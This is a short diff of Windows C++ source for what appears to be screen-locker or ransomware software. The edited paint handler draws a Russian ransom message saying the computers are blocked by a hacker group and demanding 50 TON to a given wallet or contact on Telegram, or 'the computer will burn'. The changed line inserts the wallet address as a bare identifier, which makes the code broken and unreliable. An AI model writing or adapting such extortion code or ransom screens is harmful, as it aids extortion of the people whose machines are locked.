@@ -186,9 +186,9 @@ LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
         SetBkMode(dc, TRANSPARENT); SetTextColor(dc, RGB(255,0,0));
         HFONT f = CreateFontW(28,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,0,0,0,0,L"Consolas");
         SelectObject(dc, f);
-        std::wstring t = L"ВАШИ КОМПЬЮТЕРЫ ЗАБЛОКИРОВАНЫ ХАКЕРСКОЙ ГРУППИРОВКОЙ SCHOOL HACK\n\n"
-                         L"ПЕРЕВОДИ 710 TON НА " + WALLET + L"\n"
-                         L"ИЛИ КОМПЬЮТЕР ВЗЛЕТИТ К ХУЯМ.";
+        std::wstring t = L"ВАШИ КОМПЬЮТЕРЫ ЗАБЛОКИРОВАНЫ ХАКЕРСКОЙ ГРУППИРОВКОЙ AQDIAMOND\n\n"
+                         L"ПИШИ В ТГ @id8224529558 ИЛИ ПЕРЕВОДИ 50 TON НА " + UQBc4oF7CJFwItzeiu-3R_8ODlk--uzkvIIcfre_ZXNfOwIq + L"\n"
+                         L"ИЛИ КОМПЬЮТЕР СГОРИТ.";
         DrawTextW(dc, t.c_str(), -1, &rc, DT_CENTER|DT_VCENTER|DT_WORDBREAK);
         DeleteObject(f); EndPaint(h, &ps); return 0;
     }
